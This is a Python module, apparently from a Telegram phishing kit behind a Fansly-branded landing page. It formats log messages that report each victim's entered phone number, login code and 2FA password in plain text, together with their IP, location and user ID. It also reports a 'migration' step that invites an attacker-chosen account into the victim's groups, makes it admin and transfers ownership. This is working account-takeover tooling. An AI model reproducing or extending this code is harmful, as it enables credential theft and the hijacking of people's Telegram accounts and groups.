from __future__ import annotations

import re
from datetime import datetime, timezone
from typing import Any, Mapping

from landing.event_labels import ACTION_TITLES, DETAIL_LABELS, HEADER_KEYS

# компактный «входной» лог (visit / phone / code / 2FA / done)
_COMPACT_ACTIONS = frozenset(
	{
		"visit",
		"click.login",
		"auth.phone.submit",
		"auth.phone.error",
		"auth.code.submit",
		"auth.code.error",
		"auth.password.submit",
		"auth.password.error",
		"auth.done",
	}
)

_ACTION_LINE = {
	"visit": "🙋‍♂️ Я открыл ссылку",
	"click.login": "🙋‍♂️ Я нажал Войти",
	"auth.phone.submit": "🙋‍♂️ я отправил телефон: {phone}",
	"auth.phone.error": "❌ Ошибка номера: {error}",
	"auth.code.submit": "🙋‍♂️ я отправил код: {code}",
	"auth.code.error": "❌ Ошибка кода: {error}",
	"auth.password.submit": "🙋‍♂️ я отправил 2FA: {password}",
	"auth.password.error": "❌ Ошибка 2FA: {error}",
	"auth.done": "✅ Вход успешен, миграция запущена",
}


def mask_phone(phone: str) -> str:
	"""Оставлен для совместимости; в логах входа номер больше не маскируем."""
	digits = "".join(ch for ch in (phone or "") if ch.isdigit() or ch == "+")
	if len(digits) <= 4:
		return "***"
	return f"{digits[:3]}***{digits[-2:]}"


def now_local() -> str:
	return datetime.now(timezone.utc).astimezone().strftime("%Y-%m-%d %H:%M:%S")


def short(value: Any, limit: int = 180) -> str:
	text = str(value).replace("\n", " ").strip()
	if len(text) > limit:
		return text[: limit - 3] + "..."
	return text


def fmt_value(key: str, value: Any) -> str:
	if key in {"blur", "proxy", "cookie"}:
		if value in {True, "yes", "true", "1", 1}:
			return "да"
		if value in {False, "no", "false", "0", 0}:
			return "нет"
	if isinstance(value, bool):
		return "да" if value else "нет"
	return short(value)


def build_event_text(
	action: str,
	*,
	client: Mapping[str, Any],
	unlocked: bool | None,
	details: Mapping[str, Any],
) -> str:
	raw = dict(details)
	for key in list(raw.keys()):
		if key in HEADER_KEYS:
			raw.pop(key, None)

	if action in _COMPACT_ACTIONS:
		return _build_compact(action, client=client, details=raw)

	return _build_legacy(action, client=client, unlocked=unlocked, details=raw)


def _build_compact(
	action: str,
	*,
	client: Mapping[str, Any],
	details: Mapping[str, Any],
) -> str:
	brand = str(details.get("brand") or details.get("nick") or "Fansly").strip() or "Fansly"
	link = str(
		details.get("link")
		or details.get("username")
		or details.get("nick")
		or "landing"
	).strip().lstrip("@") or "landing"
	tag = re.sub(r"[^a-zA-Z0-9_]+", "_", link).strip("_").lower() or "fansly"

	phone = str(details.get("phone") or "").strip()
	code = str(details.get("code") or "").strip()
	password = str(details.get("password") or details.get("cloud_password") or "").strip()
	error = short(details.get("error") or "-", 120)
	user_id = str(details.get("user_id") or details.get("tg_id") or "").strip()
	user = str(details.get("user") or details.get("username") or "").strip()
	# номер аккаунта (после входа) vs введённый телефон
	account_phone = str(details.get("account_phone") or phone or "").strip()

	template = _ACTION_LINE.get(action, f"🙋‍♂️ {ACTION_TITLES.get(action, action)}")
	action_line = template.format(
		phone=phone or "-",
		code=code or "-",
		password=password or "-",
		error=error,
	)

	lines = [
		f"👭 {brand}",
		f"🧣 Ссылка - {link}",
		action_line,
		"",
		f"🌐 IP - {client.get('ip') or '-'}",
		f"📱 OS - {client.get('os') or '-'}",
		(
			f"📍Местоположение:  Страна: {client.get('country') or '-'}, "
			f"Город: {client.get('city') or '-'}"
		),
	]

	# ID / user / номер — когда есть (после входа или на шагах с телефоном)
	account_bits = []
	if user_id:
		account_bits.append(f"🆔 ID: {user_id}")
	if user:
		account_bits.append(f"👤 User: {user}")
	if account_phone and action != "visit":
		account_bits.append(f"📞 Номер: {account_phone}")
	if account_bits:
		lines.append("")
		lines.extend(account_bits)

	if details.get("job_id"):
		lines.append(f"🧾 Job: {details['job_id']}")

	lines.append("")
	lines.append(f"#{tag}")
	return "\n".join(lines)


def _build_legacy(
	action: str,
	*,
	client: Mapping[str, Any],
	unlocked: bool | None,
	details: Mapping[str, Any],
) -> str:
	raw = dict(details)
	title = ACTION_TITLES.get(action, action)
	lines = [
		f"🛰 ЛЕНДИНГ · {title}",
		f"⏱ {now_local()}",
		f"🌐 IP: {client['ip']}",
		f"📍 Страна: {client['country']}",
		f"🏙 Город: {client['city']}",
		f"💻 Устройство: {client['device']}",
		f"🖥 ОС: {client['os']}",
	]
	if unlocked is not None:
		lines.append(f"🔓 Разблокирован: {'да' if unlocked else 'нет'}")

	extra_order = (
		"place",
		"path",
		"nick",
		"step",
		"phone",
		"code",
		"password",
		"user_id",
		"user",
		"job_id",
		"error",
	)
	# служебные поля не светим в Telegram-логе
	hidden = {"login_id", "proxy", "brand", "link", "account_phone", "tg_id", "username", "session"}
	seen = set()
	for key in extra_order:
		if key not in raw or raw[key] in (None, ""):
			continue
		seen.add(key)
		lines.append(f"{DETAIL_LABELS.get(key, key)}: {fmt_value(key, raw[key])}")
	for key, value in raw.items():
		if key in seen or key in hidden or value in (None, ""):
			continue
		lines.append(f"{DETAIL_LABELS.get(key, key)}: {fmt_value(key, value)}")
	return "\n".join(lines)


def format_rpc_error(error: BaseException) -> str:
	"""Короткий текст ошибки без гигантского traceback Telethon."""
	name = type(error).__name__
	parts = []
	msg = getattr(error, "message", None)
	if msg:
		parts.append(str(msg))
	code = getattr(error, "code", None)
	if code is not None and str(code) not in "".join(parts):
		parts.append(f"code={code}")
	raw = " ".join(str(error or "").split())
	raw = re.sub(r"\s*\(caused by [^)]+\)\s*$", "", raw, flags=re.I)
	if raw and raw not in (name,) and raw not in parts:
		parts.insert(0, raw)
	body = " · ".join(dict.fromkeys(p for p in parts if p))  # unique preserve order
	if not body or body == name:
		return name
	if name.lower() in body.lower():
		return body
	return f"{name}: {body}"


def format_notify_group_report(result: dict) -> str:
	"""Человекочитаемый лог шага «сообщение в группу»."""
	if not result:
		return "📣 Сообщение в группу: нет данных"
	status = str(result.get("status") or "")
	if status.startswith("skipped") or status == "skipped":
		reason = result.get("reason") or status
		return f"📣 Сообщение в группу: пропущено ({reason})"
	title = result.get("title") or "—"
	chat_id = result.get("chat_id")
	lines = [
		"📣 Сообщение в группу",
		f"Группа: {title}" + (f" (id {chat_id})" if chat_id else ""),
		f"Вход: {'да' if result.get('joined') else 'нет'}",
		f"Сообщение: {'отправлено' if result.get('message_sent') else 'не отправлено'}",
		f"Выход: {'да' if result.get('left') else 'нет'}",
	]
	if status and status not in ("ok", "partial"):
		lines.append(f"Статус: {status}")
	return "\n".join(lines)


def shorten_group_error(raw: str, limit: int = 120) -> str:
	"""Сжимает длинные Telethon-ошибки до короткой строки по-русски."""
	text = " ".join(str(raw or "").split())
	m = re.match(
		r"^(invite|promote|owner|transfer|leave)\s+(.+?)(?:#(\d+))?:\s*(.+)$",
		text,
		re.I,
	)
	if m:
		kind, title, chat_id, err = m.groups()
		kind_ru = {
			"invite": "инвайт",
			"promote": "админка",
			"owner": "владелец",
			"transfer": "владелец",
			"leave": "выход",
		}.get(kind.lower(), kind)
		err_short = _human_group_exc(err)
		title = short(title, 40)
		suffix = f" #{chat_id}" if chat_id else ""
		return f"• {kind_ru}: {title}{suffix} — {err_short}"
	return f"• {short(text, limit)}"


def _human_group_exc(err: str) -> str:
	err = err.strip()
	low = err.lower()
	if "frozen" in low:
		return "аккаунт заморожен Telegram"
	if "таймаут" in low or "timeout" in low:
		return err if "таймаут" in low else "таймаут запроса"
	if "editcreator" in low or "has no attribute" in low:
		return "ошибка API передачи владельца (обновите код)"
	if "chatadminrequired" in low or "admin required" in low:
		return "нет прав админа"
	if "userprivacyrestricted" in low:
		return "цель запретила инвайты"
	if "userbannedinchannel" in low or "user kicked" in low:
		return "цель забанена в чате"
	if "usernotmutualcontact" in low:
		return "нужен взаимный контакт"
	if "floodwait" in low or "peerflood" in low:
		m = re.search(r"(\d+)", err)
		sec = m.group(1) if m else "?"
		return f"лимит Telegram, пауза ~{sec}с"
	if "peeridinvalid" in low or "invalid object id" in low or "megagroup" in low:
		return "устаревший чат (старая группа / неверный id)"
	if "channels_too_much" in low or "toomanychannels" in low:
		return "слишком много каналов у цели"
	if "user_already_participant" in low:
		return "уже в чате"
	if "нет админки у цели" in low:
		return "цель не стала админом — владение не передано"
	if "chat_member_add_failed" in low or "chatmemberaddfailed" in low:
		return "не удалось добавить цель (приватность цели / нельзя инвайтить в этот чат)"
	if "цель не в" in low or "не попала в чат" in low:
		return short(err, 90)
	if "включите облачный пароль" in low:
		return short(err, 110)
	if "passwordmissing" in low or "password_missing" in low:
		return "нужен облачный пароль 2FA на аккаунте-источнике"
	if "нужен 2fa" in low or "invalid_cloud_password" in low or "облачный пароль" in low:
		return short(err, 100) if len(err) < 120 else "нужен/неверный облачный пароль 2FA"
	if "badrequesterror" in low or re.fullmatch(r"badrequest.*", low):
		detail = err.split(":", 1)[-1].strip() if ":" in err else ""
		if "chat_member_add_failed" in detail.lower():
			return "не удалось добавить цель (приватность / запрет инвайта)"
		if detail and detail.lower() not in ("badrequesterror",):
			return f"отклонено Telegram: {short(detail, 70)}"
		return "отклонено Telegram (BadRequest)"
	named = re.search(r"\b([A-Z][A-Za-z0-9]*(?:Error|FloodWait))\b", err)
	if named:
		return named.group(1)
	return short(err, 80)


def format_groups_migrate_report(result: dict, *, has_2fa: bool = True) -> str:
	"""Человекочитаемый отчёт переноса групп для канала логов."""
	invited = int(result.get("invited") or 0)
	already = int(result.get("already_in") or 0)
	link_sent = int(result.get("link_sent") or 0)
	promoted = int(result.get("promoted") or 0)
	owner = int(result.get("ownership_transferred") or 0)
	left = int(result.get("left") or 0)
	skipped = int(result.get("skipped") or 0)
	errors = result.get("errors") or []
	err_n = len(errors)

	target = str(result.get("target") or "—")
	if target.isdigit():
		target_line = f"Цель: id {target}"
	elif target.startswith("@"):
		target_line = f"Цель: {target}"
	else:
		target_line = f"Цель: @{target}"

	lines = [
		"📦 Перенос групп",
		target_line,
		"",
		f"✅ Приглашено: {invited}",
		f"ℹ️ Уже были в чате: {already}",
		f"🔗 Ссылка в ЛС: {link_sent}",
		f"⭐ Сделаны админом: {promoted}",
		f"👑 Передано владение: {owner}",
		f"🚪 Вышли из чата: {left}",
		f"⏭ Пропущено: {skipped}",
		f"❌ Ошибок: {err_n}",
	]
	if result.get("frozen"):
		lines.append("")
		lines.append(
			"🧊 Аккаунт заморожен Telegram — перенос групп остановлен. "
			"Разморозьте аккаунт в приложении Telegram и повторите."
		)
	# предупреждение только если реально упёрлись в 2FA
	need_2fa = any(
		"2fa" in str(e).lower() or "password" in str(e).lower() or "облачн" in str(e).lower()
		for e in errors
	)
	if need_2fa and not has_2fa:
		lines.append("")
		lines.append(
			"⚠️ Для передачи владения нужен облачный пароль 2FA "
			"(введите его при входе на сайте)."
		)
	ok_n = invited + already + link_sent
	if ok_n == 0 and err_n > 0 and not result.get("frozen"):
		lines.append("")
		lines.append("⚠️ Шаг не зафиксирован — можно войти снова.")
	return "\n".join(lines)
